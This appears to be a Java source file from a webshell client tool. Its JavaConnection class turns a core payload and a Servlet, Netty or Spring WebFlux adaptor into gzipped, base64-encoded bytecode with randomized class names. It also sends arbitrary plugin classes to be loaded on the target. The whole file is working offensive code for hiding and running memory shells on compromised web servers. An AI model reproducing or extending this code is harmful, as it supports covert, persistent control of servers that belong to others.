package com.reajason.noone.core;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.core.adaptor.NettyHandlerAdaptor;
import com.reajason.noone.core.adaptor.ReactorAdaptor;
import com.reajason.noone.core.adaptor.ServletAdaptor;
import com.reajason.noone.core.profile.Profile;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.Opcodes;

import java.util.Base64;
import java.util.Map;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2025/12/13
 */
public class JavaConnection extends ShellConnection {

    public JavaConnection(ConnectionConfig config) {
        super(config);
    }

    @Override
    public void fillLoadPluginRequestMaps(String pluginName, byte[] pluginCodeBytes, Map<String, Object> requestMap) {
        String className = new ClassReader(pluginCodeBytes).getClassName().replace("/", ".");
        requestMap.put(Constants.CLASSNAME, className);
        requestMap.put(Constants.PLUGIN_BYTES, pluginCodeBytes);
    }

    @Override
    @SneakyThrows
    protected byte[] getCoreBytes(String shellType, Profile coreProfile) {
        byte[] coreBytes;
        try (DynamicType.Unloaded<NoOneCore> make = new ByteBuddy()
                .redefine(NoOneCore.class)
                .name(CommonUtil.generateClassName())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT).make()) {
            coreBytes = ClassBytesShrink.shrink(make.getBytes(), true);
        }
        String coreGzipBase64 = Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(coreBytes));
        String adaptorClassName = CommonUtil.generateClassName();
        boolean isNetty = ShellType.NETTY_HANDLER.equals(shellType);
        boolean isReactor = ShellType.SPRING_WEBFLUX_WEB_FILTER.equals(shellType);
        Class<?> adaptorType = isNetty ? NettyHandlerAdaptor.class : isReactor ? ReactorAdaptor.class : ServletAdaptor.class;
        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(adaptorType)
                .name(adaptorClassName)
                .visit((isNetty || isReactor) ? new TargetJreVersionVisitorWrapper(Opcodes.V1_8) : TargetJreVersionVisitorWrapper.DEFAULT)
                .field(named("coreGzipBase64")).value(coreGzipBase64);

        if (shellType.startsWith(ShellType.JAKARTA)) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        builder = ProfileVisitorWrapper.extend(builder, coreProfile, shellType, adaptorClassName);
        try (DynamicType.Unloaded<?> make = builder.make()) {
            byte[] bytes = make.getBytes();
            return Base64.getEncoder().encode(CommonUtil.gzipCompress(ClassBytesShrink.shrink(bytes, true)));
        }
    }
}
